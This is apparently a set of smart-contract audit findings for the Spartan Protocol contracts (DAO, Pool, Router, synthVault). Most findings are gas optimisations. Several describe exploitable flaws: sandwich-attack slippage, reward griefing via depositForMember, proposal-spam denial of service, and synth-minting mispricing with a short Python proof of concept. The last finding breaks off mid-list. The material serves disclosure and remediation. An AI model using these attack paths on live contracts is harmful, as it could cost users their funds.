# Handle  0xRajeev   # Vulnerability details  ## Impact  The DAO codebase not handle deflationary asset tokens. However, this is handled in similar _handleTransferIn functions of Router and poolFactory which indicates that protocol allows/anticipates listing of deflationary tokens which require a start balance check/subtraction before and after transfers to account for the actual amount transferred instead of taking the face-value amount from the parameter without considering any transfer fees imposed by the token contract.  Rationale for Medium severity: This is typically a low-severity finding in protocols that uniformly do not handle deflationary/inflationary/rebasing tokens because they either whitelist-away such tokens or do not anticipate handling them (by documenting and warning users) in their protocols. Spartan however has code indicative of expecting/handling deflationary tokens in Router and poolFactory but is missing similar special handling in DAO which is a case of missed handling and so is more serious because it leads to mis-accounting and potential fund loss in different parts of the protocol code.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L266  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L206-L208  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/poolFactory.sol#L111-L113  ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add code similar to Router and poolFactory to handle deflationary tokens in DAO.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The state variables corresponding to setGenesisFactors() parameters _coolOff, _daysToEarn, _majorityFactor, _daoClaim and_daoFee are declared to be uint256 but are set using these parameters that are uint32. While it’s unlikely that these will need values > uint32, this leads to wastage of storage slots and gas.   ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L128  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L21-L24  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L19   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  The state variables can be declared uint32 to fit all five of them in a single slot and this will lead to efficient SSTOREs because they are set together. If values > uint32 are relevant, then the parameter types of setter setGenesisFactors() have to be changed.  
# Handle  0xRajeev   # Vulnerability details  ## Impact  The DAO member withdrawal is missing an emit for MemberWithdraws event. This results in lack of transparency and off-chain monitoring capability.  ## Proof of Concept  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L78  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Dao.sol#L170-L174   ## Tools Used  Manual Analysis  ## Recommended Mitigation Steps  Add an emit for the event or otherwise rationalize/document why it isn’t necessary and remove the event declaration.  
# Handle  natus   # Vulnerability details  ## Impact Here we return a value that isnt used anywhere which can safely be removed. This will save the return and also memory store gas costs  If the asset is not BNB/WBNB; we also get the startBal which is another memory store that isnt required, but more importantly we do a more expensive call to check the balance of the token in the pool contract which isnt required. This goes a step further at the 'actual' step at the end where we call the balance again and then do a MINUS math operation calling the memory value  Removing those lines will make all transactions cheaper that involve moving assets through the ROUTER, which appears to be quite a lot and sometimes even multiple times per function   ## Proof of Concept     ROUTER lines #197 to #211  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L197        ## Recommended Mitigation Steps     Remove these lines: #204 #206 #208  Also remove the return: returns(uint256 actual)  
# Handle  natus   # Vulnerability details  ## Impact     This is called with every dividend-generating txn (which is 100 or so txns per day/era by default and can be cranked up with an increase in txn volume, so higher importance than some of the other gas opts)       This is a little harder to optimize as it uses the changed state within the same function; however there is still room for optimization despite that; see below.   arrayFeeSize is called from storage twice every time; and if the array is fully built it's also called another 20 times (by default; can be increased by dao) per call to this function. As this variable doesn't change within this function; it can simply be called once at the started and stored in memory, should be a decent gas opt in a very commonly occuring txn  feeArray is also called from storage only once whilst the array is still building and not complete (this is okay) but once it's built it's called 20 times (again; by default; this might be raised) If we instead call this from storage once *just before* it's required in the loop (has to be after addFee() as this changes that feeArray's state) we can save even more gas  also; arrayFeeLength does not need to be stored in memory; just use feeArray.length from torage instead (only used once, so will only save the memory storage gas which is small)      ## Proof of Concept    ROUTER lines #285 to #297 https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L285      ## Recommended Mitigation Steps    Step1: add at the start of the function: uint _arrayFeeSize = arrayFeeSize (Get storage arrayFeeSize & store in memory)  Step2: Replace all 3 instances of arrayFeeSize with _arrayFeeSize  Step3: add below addFee(_fee): uint [] memory _feeArray = feeArray (Get storage feeArray & store in memory)  Step4: replace feeArray[i] (inside the loop) to _feeArray[i]  Step5: remove line: uint arrayFeeLength = feeArray.length and replace arrayFeeLength with feeArray.length; no need to store in memory if its only used once  
# Handle  tensors   # Vulnerability details  ## Impact There are no minimum amounts out, or checks that frontrunning/slippage is sufficiently mitigated. This means that anyone with enough capital can force arbitrarily large slippage by sandwiching transactions, close to 100%.   ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L284  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L296  ## Recommended Mitigation Steps Add a minimum amount out parameter. The function reverts if the minimum amount isn't obtained.  
# Handle  natus   # Vulnerability details  ## Impact    This function calls revenueArray from storage when setting 'n' and then twice every loop (revenueArray[i] && revenueArray[i - 1]) and then again after the loop once.       If this was instead called once at the start and stored in memory; iterated and then assigned into the storage at the end; could save some gas       ## Proof of Concept   SYNTHVAULT lines #249 to #255     https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L249       ## Recommended Mitigation Steps   Step1: Above line #249; add in:   uint [] memory _revArray = revenueArray  (Get the storage revenueArray and store it in memory)      Step2: change revenueArray.length to _revArray.length  (maybe even remove this memory variable and just call the length directly in the loop conditions in place of 'n'?)     Step3: change:   revenueArray[i] = revenueArray[i - 1]   to:   _revArray[i] = _revArray[i - 1]      Step4: change:   revenueArray[0] = _fee   To:   _revArray[0] = _fee      Step5: add:   revenueArray = _revArray  as the final line inside the function  
# Handle  natus   # Vulnerability details  ## Impact    Here we call the storage stakedSynthAssets 3 times in the loop or 4 times per loop if the reward is > 0.   It could instead be called once before the loop and stored in memory. Will save more gas as time goes on and the stakedSynthAssets array potentially gets larger as more assets get listed      ## Proof of Concept   SYNTHVAULT lines #121 to #132   https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L121      ## Recommended Mitigation Steps   Step1: Above line #122; add in:   address [] memory _stakedSynthAssets = stakedSynthAssets  (Get the storage stakedSynthAssets and store it in memory)     Then: replace all 4 instances of:  stakedSynthAssets with _stakedSynthAssets  
# Handle  natus   # Vulnerability details  ## Impact   This function calls revenueArray from storage when setting 'n' and then twice every loop (revenueArray[i] && revenueArray[i - 1]) and then again after the loop once.     If this was instead called once at the start and stored in memory; iterated and then assigned into the storage at the end; could save some gas     ## Proof of Concept  POOL lines #357 to #363   https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L357     ## Recommended Mitigation Steps  Step1: Above line #358; add in:  uint [] memory _revArray = revenueArray (Get the storage revenueArray and store it in memory)    Step2: change revenueArray.length to _revArray.length    Step3: change:  revenueArray[i] = revenueArray[i - 1]  to:  _revArray[i] = _revArray[i - 1]    Step4: change:  revenueArray[0] = _fee  To:  _revArray[0] = _fee    Step5: add:  revenueArray = _revArray as the final line inside the function  
# Handle  natus   # Vulnerability details  ## Impact  This function calls feeArray from storage when setting 'n' and then twice every loop (feeArray[i] && feeArray[i - 1]) and then again after the loop once.   If this was instead called once at the start and stored in memory; iterated and then assigned into the storage at the end; could save some gas   ## Proof of Concept UTILS lines #300 to #306  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L301    ## Recommended Mitigation Steps Step1: Above line #301; add in: uint [] memory _feeArray = feeArray (Get the storage feeArray and store it in memory)  Step2: change feeArray.length to _feeArray.length  Step3: change: feeArray[i] = feeArray[i - 1] to: _feeArray[i] = _feeArray[i - 1]  Step4: change: feeArray[0] = _fee To: _feeArray[0] = _fee  Step5: add: feeArray = _feeArray  as the final line inside the function  
# Handle  hrkrshnn   # Vulnerability details  ## Use unchecked blocks when safemath is not required  In some cases, it's unnecessary to use the default checked arithmetic. In such cases, wrapping the block in unchecked would save gas.  One example is:  ``` diff @@ -271,11 +272,13 @@ contract Pool is iBEP20 {       // Check the TOKEN amount received by this Pool      function _getAddedTokenAmount() internal view returns(uint256 _actual){ -        uint _tokenBalance = iBEP20(TOKEN).balanceOf(address(this)); -        if(_tokenBalance > tokenAmount){ -            _actual = _tokenBalance-(tokenAmount); -        } else { -            _actual = 0; +        uint _tokenBalance = iBEP20(TOKEN).balanceOf(address(this)); +       unchecked { +            if(_tokenBalance > tokenAmount){ +                _actual = _tokenBalance-(tokenAmount); +            } else { +                _actual = 0; +            }  ```  For loops, such optimizations would save a lot of gas.  ``` diff @@ -356,9 +359,11 @@ contract Pool is iBEP20 {       function addFee(uint _rev) internal {          uint _n = revenueArray.length; // 2 +       require(_n > 0); +       unchecked {          for (uint i = _n - 1; i > 0; i--) {              revenueArray[i] = revenueArray[i - 1];          } +       }          revenueArray[0] = _rev;      }  } ```   
# Handle  hrkrshnn   # Vulnerability details  ## Variables that can be converted into immutable  ``` txt Warning: Variable declaration can be converted into an immutable.   --> contracts/BondVault.sol:12:5:    | 12 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Dao.sol:16:5:    | 16 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Dao.sol:18:5:    | 18 |     uint256 public secondsPerEra;   // Amount of seconds per era (Inherited from BASE contract; intended to be ~1 day)    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/DaoVault.sol:12:5:    | 12 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/DaoVault.sol:13:5:    | 13 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:14:5:    | 14 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:15:5:    | 15 |     address public TOKEN;    |     ^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:16:5:    | 16 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:19:5:    | 19 |     uint8 public override decimals; uint256 public override totalSupply;    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Pool.sol:27:5:    | 27 |     uint public genesis; // Timestamp from when the pool was first deployed (For UI)    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Router.sol:9:5:   | 9 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Router.sol:10:5:    | 10 |     address public WBNB;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Router.sol:11:5:    | 11 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Synth.sol:7:5:   | 7 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Synth.sol:8:5:   | 8 |     address public LayerONE; // Underlying relevant layer1 token   |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/Synth.sol:9:5:   | 9 |     uint public genesis;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Synth.sol:10:5:    | 10 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Synth.sol:13:5:    | 13 |     uint8 public override decimals; uint256 public override totalSupply;    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Utils.sol:10:5:    | 10 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/Utils.sol:11:5:    | 11 |     uint public one = 10**18;    |     ^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/FallenSpartans.sol:10:5:    | 10 |     address public SPARTA;    |     ^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/FallenSpartans.sol:11:5:    | 11 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/FallenSpartans.sol:12:5:    | 12 |     uint256 public genesis;    |     ^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/outside-scope/Reserve.sol:8:5:   | 8 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/Sparta.sol:30:5:    | 30 |     uint256 private _100m;    |     ^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/Sparta.sol:31:5:    | 31 |     uint256 public maxSupply;    |     ^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/outside-scope/Sparta.sol:38:5:    | 38 |     address public BASEv1;    |     ^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/poolFactory.sol:7:5:   | 7 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/poolFactory.sol:8:5:   | 8 |     address public WBNB;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/poolFactory.sol:10:5:    | 10 |     uint public curatedPoolSize;    // Max amount of pools that can be curated status    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/synthFactory.sol:6:5:   | 6 |     address public BASE;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.  --> contracts/synthFactory.sol:7:5:   | 7 |     address public WBNB;   |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/synthVault.sol:14:5:    | 14 |     address public BASE;    |     ^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/synthVault.sol:15:5:    | 15 |     address public DEPLOYER;    |     ^^^^^^^^^^^^^^^^^^^^^^^   Warning: Variable declaration can be converted into an immutable.   --> contracts/synthVault.sol:23:5:    | 23 |     uint public genesis;                // Timestamp from when the synth was first deployed (For UI)    |     ^^^^^^^^^^^^^^^^^^^  ```   Instead of using an expensive `sload` operation, converting to immutable would make reading to cost just 3 gas.   ## Tools Used  A custom compiler.  
# Handle  jonah1005   # Vulnerability details  ## Impact When users try to born synth, the fee and the value of Sparta is calculated at contract `Pool` while the logic of burning `Pool`s Lp and Synth is located at `Synth` contract.  Users can send synth to the `Synth` contract directly and trigger `burnSynth` at the `Pool` contract. The Pool would not send any token out while the `Synth` contract would burn the lp and Synth. While users can not drain the liquidity by doing this, breaking the AMM rate unexpectedly is may lead to troubles.  The calculation of debt and the fee would end up with a wrong answer.  ## Proof of Concept https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L245  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Synth.sol#L174  ## Tools Used None  ## Recommended Mitigation Steps  Pool's `burnSynth` and Synth's `burnSynth` are tightly coupled functions. In fact, according to the current logic, `Synth:burnSynth` should only be triggered from a valid `Pool` contract.  IMHO, applying the`Money in - Money Out` model in the `Synth` contract does more harm than good to the readability and security of the protocol. Consider to let `Pool` contract pass the parameters to the `Synth` contract and add a require check in the `Synth` contract.    
# Handle  hickuphh3   # Vulnerability details  ### Impact  `hasMinority()` is defined as a public function, but is unused in the contract. It can either be entirely removed or have its visibility changed to `external`.  
# Handle  GalloDaSballo   # Vulnerability details  ## Impact The function `_deposit` sets `mapMemberSynth_lastTime` to a date in the future https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L107   `mapMemberSynth_lastTime` is also used to calculate rewards earned  `depositForMember` allows anyone, to "make a donation" for the member and cause that member to loose all their accrued rewards  This can't be used for personal gain, but can be used to bring misery to others.   ## Proof of Concept `depositForMember` https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L95 and can be called by anyone  This will set the member  ```  mapMemberSynth_lastTime[_member][_synth] = block.timestamp + minimumDepositTime; // Record deposit time (scope: member -> synth) ```  this can be continuously exploited to make members never earn any reward   ## Recommended Mitigation Steps  This is the second submission under the same exploit This can be mitigated by harvesting for the user right before changing `mapMemberSynth_lastTime[_member][_synth]`  https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/synthVault.sol#L107  
# Handle  natus   # Vulnerability details  ## Impact  Gas optimization / non-critical issue. Wasted lines of code creating and setting a local variable that does not appear to be required. I can't think of a reason to leave it in.    ## Proof of Concept _token local variable is not used anywhere in the codebase. Can be removed to save gas and compile size. Looks like it's to handle WBNB (if it was required) but forgot to check/remove after it was catered for elsewhere. - https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Router.sol#L83    ## Tools Used N/A    ## Recommended Mitigation Steps ROUTER.addLiquiditySingleForMember() - Remove line #82 - Remove line #83  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The `calcLiquidityUnitsAsym()` function's last 2 lines are:  ```jsx uint two = 2; return (totalSupply * amount) / (two * (amount + baseAmount)); ```  The `two` assignment seems unnecessary.  ### Recommended Mitigation Steps  `return (totalSupply * amount) / (two * (amount + baseAmount));`  
# Handle  hickuphh3   # Vulnerability details  ### Impact  `newParamProposal()` takes in a `uint32 param` as an input argument. The valid scenarios for this proposal are for changing the cooloff period and erasToEarn via the `changeCooloff()` and `changeEras()`. These functions however cast the `param` to `uint256` before assigning it to the relevant variable.   We therefore have either of the following cases:  1.  `uint32 param` should be increased to `uint256 param` 2. `coolOffPeriod` and `erasToEarn` can be decreased in size to `uint32` instead of `uint256`. For further optimizations, these 2 variables should be grouped together so that they take up 1 storage slot instead of 2 separate ones.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  `BASE` is defined as an `address` type, but is casted as `iBEP20` in almost every instance within the Dao contract, and in numerous instances in many other contracts as well. It would therefore be better to define it as `iBEP20` instead, to avoid casting.  ### Recommended Mitigation Steps  Change `address public BASE;` to `iBEP public BASE`. Castings of `BASE` to `iBEP20` can be removed subsequently.  
# Handle  jonah1005   # Vulnerability details  ## Impact `Pool` calculates the amount to be minted based on `token_amount` and `sparta_amount` of the Pool. However, since `token_amount` in the pool would not decrease when users mint Synth, it's always cheaper to mint synth than swap the tokens.  The synthetics would be really hard to be on peg. Or, there would be a flash-loan attacker to win all the arbitrage space.  ## Proof of Concept Pool's mint synth https://github.com/code-423n4/2021-07-spartan/blob/e2555aab44d9760fdd640df9095b7235b70f035e/contracts/Pool.sol#L229-L242  The synth amount is calculated at L:232 ``` uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, tokenAmount); ``` which is the same as swapping base to token at L:287 ``` uint256 _X = baseAmount; uint256 _Y = tokenAmount; _y =  iUTILS(_DAO().UTILS()).calcSwapOutput(_x, _X, _Y); // Calc TOKEN output ```  However, while swapping tokens decrease pool's token, mint just mint it out of the air.  Here's a POC: Swap sparta to token for ten times ```python for i in range(10):     amount = 10 * 10**18     transfer_amount = int(amount/10)     base.functions.transfer(token_pool.address, transfer_amount).transact()     token_pool.functions.swapTo(token.address, user).transact() ```  Mint Synth for ten times ```python for i in range(10):     amount = 10 * 10**18     transfer_amount = int(amount/10)     base.functions.transfer(token_pool.address, transfer_amount).transact()     token_pool.functions.mintSynth(token_synth.address, user).transact() ``` The Pool was initialized with 10000:10000 in both cases. While the first case(swap token) gets `4744.4059` and the second case gets `6223.758`.  ## Tools Used None ## Recommended Mitigation Steps The debt should be considered in the AMM pool.  I recommend to maintain a debt variable in the Pool and use `tokenAmount - debt` when the Pool calculates the token price. Here's some idea of it. ```     uint256 public debt;     function _tokenAmount() returns (uint256) {         return tokenAmount - debt;     }      // Swap SPARTA for Synths     function mintSynth(address synthOut, address member) external returns(uint outputAmount, uint fee) {         require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synthOut) == true, "!synth"); // Must be a valid Synth         uint256 _actualInputBase = _getAddedBaseAmount(); // Get received SPARTA amount          // Use tokenAmount - debt to calculate the value         uint output = iUTILS(_DAO().UTILS()).calcSwapOutput(_actualInputBase, baseAmount, _tokenAmount()); // Calculate value of swapping SPARTA to the relevant underlying TOKEN          // increment the debt         debt += output          uint _liquidityUnits = iUTILS(_DAO().UTILS()).calcLiquidityUnitsAsym(_actualInputBase, address(this)); // Calculate LP tokens to be minted         _incrementPoolBalances(_actualInputBase, 0); // Update recorded SPARTA amount         uint _fee = iUTILS(_DAO().UTILS()).calcSwapFee(_actualInputBase, baseAmount, tokenAmount); // Calc slip fee in TOKEN         fee = iUTILS(_DAO().UTILS()).calcSpotValueInBase(TOKEN, _fee); // Convert TOKEN fee to SPARTA         _mint(synthOut, _liquidityUnits); // Mint the LP tokens directly to the Synth contract to hold         iSYNTH(synthOut).mintSynth(member, output); // Mint the Synth tokens directly to the user         _addPoolMetrics(fee); // Add slip fee to the revenue metrics         emit MintSynth(member, BASE, _actualInputBase, TOKEN, outputAmount);       return (output, fee);     }  ```   
# Handle  hickuphh3   # Vulnerability details  ### Impact  The lines below of the `addLiquiditySingleForMember()` function  ```jsx address _token = token; if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB ```  are redundant since `_token` is not used subsequently. Note that `_handleTransferIn()` will perform the handling of native BNB transfers.  ### Recommended Mitigation Steps  The mentioned lines above can be removed.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  ```jsx // Pool.sol: L344-345 map30DPoolRevenue = 0; map30DPoolRevenue = map30DPoolRevenue+(_fee);  // Router.sol: L317-318 mapAddress_30DayDividends[_pool] = 0; mapAddress_30DayDividends[_pool] = mapAddress_30DayDividends[_pool] + _fees; ```  can simply be written as  ```jsx map30DPoolRevenue = _fee;  mapAddress_30DayDividends[_pool] = _fees; ```  respectively.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The contract performs allowance checks for transfers in 2 ways:  1. Check allowance is greater than requested amount, revert otherwise. Then do allowance decrement. (Eg. in `transferFrom`) 2. Directly do the allowance decrement, will revert for underflow since sol 0.8.3 is used. (Eg. in `burnFrom`  It is best to stick to 1 method for consistency. For gas optimizations, the 2nd method is better, but the first provides more meaningful revert messages to aid debugging.  ### Recommended Mitigation Steps  Commit to either method, not both.  
# Handle  hickuphh3   # Vulnerability details  ```jsx function isEqual(bytes memory part1, bytes memory part2) external pure returns(bool equal){   if(sha256(part1) == sha256(part2)){       return true;   } } ```  Both implementations can be simplified and made consistent to be  ```jsx function isEqual(bytes memory part1, bytes memory part2) external pure returns(bool){   return(sha256(part1) == sha256(part2)); } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  In DaoVault and BondVault, the following mappings are declared private:  - `mapMember_weight` - `mapMemberPool_weight`  The DaoVault has an additional private mapping `mapMemberPool_balance`.  Despite this, the DaoVault has getter methods for all 3 mappings, whilst the BondVault only has a getter method for `mapMember_weight`.  The getter methods (which aren't included in the interface) would be unnecessary if the mappings are declared as public. Also, the BondVault might perhaps be lacking a view method for `mapMemberPool_weight`.   Should the separate getter methods remain unchanged, note that the getter method for `getMemberWeight()` has a convoluted implementation:  ```jsx function getMemberWeight(address member) external view returns (uint256) {  if (mapMember_weight[member] > 0) {   return mapMember_weight[member];   } else {     return 0;     } } ```  which can be simplified to simply returning the `mapMember_weight[member]`.  ### Recommended Mitigation Steps  - Declare the relevant private mappings as public. - Kindly check if `mapMemberPool_weight` should be public for the BondVault as well, since it is the case for the DaoVault.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The `hasMajority()`, `hasQuorum()` and `hasMinority()` functions contains the following implementation:  ```jsx if(votes > consensus){  return true; } else {  return false; } ```  This can be reduced to `return (votes > consensus);`  
# Handle  hickuphh3   # Vulnerability details  ### Impact  - `_pool` is fetched once in `claimForMember()`, but is fetched again in its sub function `decreaseWeight()`. Since `decreaseWeight()` is solely called by `claimForMember()`, the `_pool` variable can be passed as an input to `decreaseWeight()` to avoid having to retrieve its value again. - In `increaseWeight()` and `decreaseWeight()`, zeroing out `mapMemberPool_weight` is redundant as it is set to another value 2 lines later.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  `uint private lastMonth; // Timestamp of the start of current metric period (For UI)`   There is no getter method for `lastMonth`, which makes the (For UI) comment is erroneous.  ### Recommended Mitigation Steps  Make it `public` or edit the comment  
# Handle  hickuphh3   # Vulnerability details  ### Impact  1. `DEPLOYER` is set in the constructor but is not used anywhere in the contract 2. Redundant initialization `lastMonth = 0;` 3. `genesis` and `decimals` can have the `immutable` keywords since they are only set in the constructor and can't be changed 4. `iUTILS(_DAO().UTILS())` is called many times in `mintSynth()`, `removeForMember()` and `_swap*()` functions. Recommend storing as a local variable in these functions. 5. Since `revenueArray` cannot exceed length 2, the `addFee` function can be directly incorporated into the `addRevenue` function. Its for loop can be replaced with direct replacement of values. Also, `revenueArray.length != 2` is cleaner and easier to read compared to `!(revenueArray.length == 2)`. Given its purpose and usage, `archiveRevenue` / `cachePastRevenue` seems to be a better function name. If it is clear that revenueArray will be kept constant at 2, an alternative is to simply store the values as 2 separate variables.  ### Recommended Mitigation Steps  1. Remove `DEPLOYER` 2. Remove the initialization `lastMonth = 0;` 3. `uint public immutable genesis;` and `uint8 public immutable override decimals;` 4. `iUTILS utils = _DAO().UTILS();` should utils be called more than once in a function 5. Possible implementation below  ```jsx function archiveRevenue(uint _totalRev) {  if (revenueArray.length == 2) {   // shift value to the right   revenueArray[1] = revenueArray[0];   revenueArray[0] = _totalRev;   } else {     // populate revenueArray to be of length 2     revenueArray.push(_totalRev);   } } ```  
# Handle  hickuphh3   # Vulnerability details  ### Impact  - `calcClaimBondedLP()` returns `_BONDVAULT.calcBondedLP(()` which is a view function. Hence, `calcClaimBondedLP()` can be a view function as well. - `hasMinority()` is not called within the contract. Hence, the `public` keyword can be reduced to `external` to save gas.  ### Recommended Mitigation Steps  - Restrict `calcClaimBondedLP()` visibility to `view` (ie. add `view` keyword). - Reduce `hasMinority()` from `public` to `external`  
# Handle  hickuphh3   # Vulnerability details  ### Impact  `_handleTransferIn()`, `DEPLOYER` and `onlyDAO()` are defined but unused. Hence, they can be removed from the contract.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  The `swapTo()` function should not be payable since the WBNB-SPARTA pool should not receive BNB, but WBNB. The router swap functions handles the wrapping and unwrapping of BNB.  Furthermore, the `swapTo()` will not detect any deposited BNB, so any swapTo() calls that have msg.value > 0 will have their BNB permanently locked in the pool contract.   ### Recommended Mitigation Steps  Remove `payable` keyword in `swapTo()`.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  `depositLPForMember()` and `bond()` invokes `harvest()` if a user has existing LP deposits or bonded assets into the DAO. This is to prevent users from depositing more assets before calling `harvest()` to earn more DAOVault incentives. However, `harvest()` reverts if reserve emissions are turned off.   Hence, deposits / bonds performed by existing users will fail should reserve emissions be disabled.  ### Recommended Mitigation Steps  Cache claimable rewards into a separate mapping when `depositLPForMember()` and `bond()` are called. `harvest()` will then attempt to claim these cached + pending rewards. Perhaps Synthetix's Staking Rewards contract or Sushiswap's FairLaunch contract can provide some inspiration.  
# Handle  hickuphh3   # Vulnerability details  ### Impact  In general, creating invalid proposals is easy due to the lack of validation in the `new*Proposal()` functions.  - The `typeStr` is not validated at all. For example, one can call `newActionProposal()` with `typeStr = ROUTER` or `typeStr = BAD_STRING`, both of which will pass. The first will cause `finaliseProposal()` to fail because the proposed address is null, preventing `completeProposal()` from executing. The second does nothing because it does not equate to any of the check `typeStr`, and so `completeProposal()` isn't executed at all. - Not checking the proposed values are null. The checks only happen in `finaliseProposal()` when the relevant sub-functions are called, like the `move*()` functions.  All of these scenarios lead to a mandatory 15 day wait since proposal creation in order to be cancelled, which prevents the creation of new proposals (in order words, denial of service of the DAO).  ### Recommended Mitigation Steps  1. Since the number of proposal types is finite, it is best to restrict and validate the `typeStr` submitted. Specifically,     - `newActionProposal()` should only allow `FLIP_EMISSIONS` and `GET_SPARTA` proposal types     - `newAddressProposal()` should only allow `DAO`, `ROUTER`, `UTILS`, `RESERVE`, `LIST_BOND`, `DELIST_BOND`, `ADD_CURATED_POOL` and  `REMOVE_CURATED_POOL` proposal types     - 